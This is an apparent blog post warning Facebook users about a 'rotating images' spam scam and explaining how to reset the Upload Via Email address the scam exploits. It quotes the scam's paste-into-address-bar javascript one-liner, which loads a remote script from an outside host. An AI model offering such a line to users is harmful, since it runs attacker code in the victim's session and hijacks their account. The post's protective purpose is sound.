Another one sleazy spam is now underway on Facebook and it involves showing people **Face-book images rotate 360\***. Similar one is pretending to show **Really cool Facebook revolving images.** **[cosmoGeek](http://www.cosmogeek.info/)** instantly alerted its members about these kind of spams in past few days via Facebook fan [page](http://www.facebook.com/cosmoGeek) and [Twitter](http://twitter.com/k_avinash).

All these users unfortunately and unknowingly copy pasted the following script into their browser address bars hoping to see revolving images.

> JavaScript:(a = (b =  document).createElement(&amp;quot;script&amp;quot;)).src =   &amp;quot;//graphicgiants.com/majic.js?show&amp;quot;, b.body.appendChild(a); void(0)

Once you do this, the spam makes wall posts and updates users’ status’. To do this, it is using the newly launched Facebook feature called “**Upload Via E-mail**”. It is a unique personal Email address given to every user which allows one to post status updates or send photos and videos straight to one’s profile. The spam has recorded this Email address of yours and is using it to update your status. Thankfully, Facebook lets you change this email ID. This is how you can do it.

1. From Facebook mobile [link](http://www.facebook.com/mobile/), find “_More Facebook Mobile Products_” written somewhere down. Find “_Upload Via Email_“. Click “_Find out more_“
2. In the next window, click “_refresh your upload email”_
3. Now press reset. Don’t worry, you now got a new personal upload email address. The spam won’t work anymore.

JavaScript can be very malicious and from now on, please just don’t end up in entering random scripts in your browser! Share this post if you found it useful and help others in preventing spam.
